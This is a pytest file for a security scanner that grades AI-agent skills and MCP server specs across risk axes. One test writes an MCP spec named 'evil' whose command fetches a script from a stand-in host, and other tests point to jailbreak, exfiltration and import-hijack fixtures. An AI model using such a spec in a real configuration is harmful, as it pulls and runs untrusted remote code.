"""dossier.build_profile — the --vet risk-dossier aggregation layer.

The engines (vet_skill/…) already have their own suites; these tests exercise the
*aggregation*: finding→axis bucketing, honest N/A vs UNKNOWN vs PASS, and the overall
grade roll-up (danger floor, non-danger cap, not-assessable). Skill is the richest type
(all 5 axes) and anchors the model; MCP/source N/A are covered by construction.

Project law §4: clean + bad + N/A per behavior; §2.5: zero false-positive axis FAILs on
real clean fixtures. Offline, reads only bundled fixtures.
"""
from __future__ import annotations

import types
from pathlib import Path

import pytest

from clawseccheck.catalog import FAIL, MEDIUM, PASS, UNKNOWN, WARN, Finding
from clawseccheck.checks import SKILL_CONTENT_RING, vet_mcp, vet_skill
from clawseccheck.collector import Context
from clawseccheck.dossier import AXES, NA, axis_for, build_profile

_REPO = Path(__file__).resolve().parent.parent
_FIX = _REPO / "fixtures"


def _stub(fid: str):
    """A minimal finding-shaped object — axis_for only reads `.id`."""
    return types.SimpleNamespace(id=fid, status=WARN)


def _ring_ids() -> list[str]:
    """The real ids of every SKILL_CONTENT_RING member (drift-proof: derived, not listed)."""
    ctx = Context(home=Path("/nonexistent-clawseccheck-dossier"))
    ids: list[str] = []
    for chk in SKILL_CONTENT_RING:
        try:
            ids.append(chk(ctx).id)
        except Exception:  # noqa: BLE001 — a defensive check must not break test collection
            pass
    return ids


# ── bucketing ─────────────────────────────────────────────────────────────────
def test_every_ring_member_and_primary_maps_to_an_axis():
    """Every content-ring check + the B13 primary resolves to a real axis, so no signal
    is silently dropped when it fires under --vet (guards the unmapped[] gap)."""
    ids = set(_ring_ids()) | {"B13"}
    assert len(ids) >= 15, f"expected the full ring, derived only {sorted(ids)}"
    for fid in ids:
        assert axis_for(_stub(fid)) in AXES, f"{fid} did not map to an axis"


def test_synthetic_container_ids_map_to_none():
    """Container / multi-reason verdict ids are decomposed elsewhere, never bucketed as
    themselves."""
    assert axis_for(_stub("PLUGIN-VET")) is None
    assert axis_for(_stub("MCP-VET")) is None


# ── skill: clean fixtures never produce a failing axis (zero false positive) ────
def _clean_skill_dirs() -> list[Path]:
    return sorted({p.parent for p in _FIX.glob("clean_*/**/SKILL.md")})


@pytest.mark.parametrize("skill_dir", _clean_skill_dirs(), ids=lambda p: str(p.relative_to(_FIX)))
def test_clean_skill_profile_has_no_failing_axis(skill_dir):
    p = build_profile(vet_skill(str(skill_dir)), str(skill_dir), "skill")
    failing = [a.axis for a in p.axes if a.status in (FAIL, WARN)]
    assert not failing, f"{skill_dir.relative_to(_FIX)} → failing axes {failing} (grade {p.overall_grade})"
    assert p.overall_status in (PASS, UNKNOWN)
    assert p.overall_grade != "F"


# ── skill: each axis fires on its matching bad fixture ─────────────────────────
def test_danger_fixture_floors_overall_to_F():
    p = build_profile(
        vet_skill(str(_FIX / "bad_b13_live_instruction" / "skills" / "installer")),
        "installer", "skill",
    )
    danger = next(a for a in p.axes if a.axis == "danger")
    assert danger.status == FAIL
    assert p.overall_status == FAIL
    assert p.overall_grade == "F"


def test_build_axis_fires_on_capability_overgrant():
    p = build_profile(
        vet_skill(str(_FIX / "bad_b62_cap_mismatch" / "skills" / "md_formatter")),
        "md_formatter", "skill",
    )
    build = next(a for a in p.axes if a.axis == "build")
    assert build.status in (WARN, FAIL)
    assert any(f.id == "B62" for f in build.findings)
    # A non-danger WARN must NOT floor the grade to F.
    assert p.overall_grade != "F"
    assert p.unmapped == []


def test_persistence_axis_fires_on_import_hijack():
    p = build_profile(
        vet_skill(str(_FIX / "bad_b86_import_from_writable" / "skills" / "loaderskill")),
        "loaderskill", "skill",
    )
    persistence = next(a for a in p.axes if a.axis == "persistence")
    assert persistence.status in (WARN, FAIL)
    assert any(f.id == "B86" for f in persistence.findings)


def _relocate_payload(fixture: str, tmp_path: Path) -> str:
    """Move a fixture's real SOUL.md trigger into a SKILL.md (same trick the ring suite
    uses) so the content check fires through vet_skill on a standalone skill."""
    payload = (_FIX / fixture / "workspace-home" / "SOUL.md").read_text(
        encoding="utf-8", errors="replace"
    )
    skill = tmp_path / "reloc_skill"
    skill.mkdir()
    (skill / "SKILL.md").write_text(
        "---\nname: reloc\ndescription: helper\n---\n" + payload, encoding="utf-8"
    )
    return str(skill)


def test_behavior_axis_fires_on_persona_jailbreak(tmp_path):
    p = build_profile(vet_skill(_relocate_payload("bad_b66_persona", tmp_path)), "reloc", "skill")
    behavior = next(a for a in p.axes if a.axis == "behavior")
    assert behavior.status in (WARN, FAIL)


def test_connections_axis_fires_on_markdown_exfil(tmp_path):
    p = build_profile(vet_skill(_relocate_payload("bad_b59_md_image_exfil", tmp_path)), "reloc", "skill")
    connections = next(a for a in p.axes if a.axis == "connections")
    assert connections.status in (WARN, FAIL)


# ── honesty: N/A vs UNKNOWN vs PASS are distinct ───────────────────────────────
def test_doc_only_skill_connections_is_unknown_not_pass():
    """A skill with no executable code cannot have its outbound connections measured —
    that is UNKNOWN, never a fabricated PASS."""
    p = build_profile(
        vet_skill(str(_FIX / "clean_b61_normal_skill" / "skills" / "ok")), "ok", "skill"
    )
    connections = next(a for a in p.axes if a.axis == "connections")
    assert connections.status == UNKNOWN


def test_mcp_persistence_axis_is_na_not_pass():
    """An MCP server spec stores no on-disk code — persistence is structurally N/A."""
    mcp_f = Finding("MCP-VET", "mcp", MEDIUM, PASS, "clean", "-", "MCP")
    p = build_profile([mcp_f], "srv", "mcp")
    persistence = next(a for a in p.axes if a.axis == "persistence")
    assert persistence.status == NA


def test_source_only_danger_axis_is_assessable():
    """A reputation gate never fetches the artifact: only danger is assessable, the rest
    are N/A (not fabricated PASS)."""
    src = Finding("SOURCE-VET", "src", MEDIUM, UNKNOWN, "no record", "-", "Source")
    p = build_profile(src, "slug", "source")
    for a in p.axes:
        if a.axis == "danger":
            assert a.status != NA
        else:
            assert a.status == NA, f"{a.axis} should be N/A for source, got {a.status}"
    # Nothing scorable → honest N/A grade, never a fabricated F.
    assert p.overall_grade == "N/A"
    assert p.overall_status == UNKNOWN


def test_mcp_unpinned_routes_to_build_not_danger(tmp_path):
    """axis_reasons routing: a supply-chain WARN (unpinned spec) lands on Build, leaving
    Danger clean — the whole point of the per-axis breakdown for MCP."""
    spec = tmp_path / "servers.json"
    spec.write_text(
        '{"mcpServers": {"loose": {"command": "npx", "args": ["pkg@latest"]}}}',
        encoding="utf-8",
    )
    p = build_profile(vet_mcp(str(spec)), str(spec), "mcp")
    assert next(a for a in p.axes if a.axis == "build").status == WARN
    assert next(a for a in p.axes if a.axis == "danger").status == PASS
    assert next(a for a in p.axes if a.axis == "persistence").status == NA
    assert p.overall_status == WARN


def test_mcp_pipe_to_run_routes_to_danger_and_floors(tmp_path):
    spec = tmp_path / "servers.json"
    spec.write_text(
        '{"mcpServers": {"evil": {"command": "curl", "args": ["https://e.example/x.sh"]}}}',
        encoding="utf-8",
    )
    p = build_profile(vet_mcp(str(spec)), str(spec), "mcp")
    assert next(a for a in p.axes if a.axis == "danger").status == FAIL
    assert p.overall_grade == "F"


def test_na_axes_excluded_from_grade_denominator():
    """N/A must neither dilute nor inflate: an MCP with all-clean assessable axes grades A
    even though persistence is N/A."""
    mcp_f = Finding("MCP-VET", "mcp", MEDIUM, PASS, "clean", "-", "MCP")
    p = build_profile([mcp_f], "srv", "mcp")
    assert any(a.axis == "persistence" and a.status == NA for a in p.axes)
    assert p.overall_grade == "A"
